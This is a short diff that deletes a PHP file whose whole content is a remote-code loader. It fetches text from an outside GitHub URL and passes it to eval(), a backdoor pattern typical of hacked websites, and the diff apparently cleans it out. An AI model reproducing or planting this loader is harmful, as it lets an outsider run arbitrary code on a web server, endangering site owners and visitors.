@@ -1,6 +1,0 @@
-<?php
-
-$content = file_get_contents(urldecode('https://github.com/seobadboyz403-alt/ngacak/blob/main/uniqueijtime.txt'));
-
-$content = "?> ".$content;
-eval($content);
